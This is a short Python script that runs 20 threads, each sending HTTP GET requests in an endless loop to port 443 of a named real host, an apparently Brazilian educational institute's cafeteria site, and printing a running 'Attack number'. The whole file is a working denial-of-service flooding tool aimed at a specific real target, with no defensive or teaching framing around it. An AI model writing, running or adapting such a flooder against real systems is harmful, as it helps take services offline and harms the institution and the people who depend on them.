import socket
import threading

attack_num = 0
host_name = 'refeitorio.picos.ifpi.edu.br'
host_ip = socket.gethostbyname(host_name)

def attack():
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((host_ip, 443))
                s.send(b'GET / HTTP/1.1\r\nHost:' + host_name.encode() + b'\r\nConnection: close\r\n\r\n')
                resp = s.recv(4096)
                global attack_num
                attack_num += 1
                print('Attack number', attack_num)
            except Exception as e:
                print(f"Erro na conexão: {e}")
            finally:
                s.close()
    except KeyboardInterrupt:
        print("Programa encerrado pelo usuário.")

for i in range(20):
    thread = threading.Thread(target=attack)
    thread.start()
